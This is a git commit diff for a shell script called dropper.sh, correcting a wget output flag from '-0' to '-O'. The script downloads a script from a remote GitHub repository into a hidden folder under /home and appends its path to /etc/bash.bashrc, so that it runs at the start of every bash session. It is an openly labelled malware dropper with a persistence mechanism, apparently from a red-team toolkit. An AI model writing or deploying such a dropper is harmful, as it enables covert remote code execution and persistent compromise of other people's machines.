59c84965580e4bbe670512ee155342422967b03f
Jason Howe <60302510+P0nt14c@users.noreply.github.com>
2021-01-23 10:32:00 -0500

    0's aren't O's

--- dropper.sh
+++ dropper.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-wget -0 /home/.hidden/alphabet_cereal.sh https://github.com/P0nt14c/alphabet_cereal/blob/master/methods.sh
+wget -O /home/.hidden/alphabet_cereal.sh https://github.com/P0nt14c/alphabet_cereal/blob/master/methods.sh
 
 echo /home/.hidden/alphabet_cereal.sh >> /etc/bash.bashrc
 
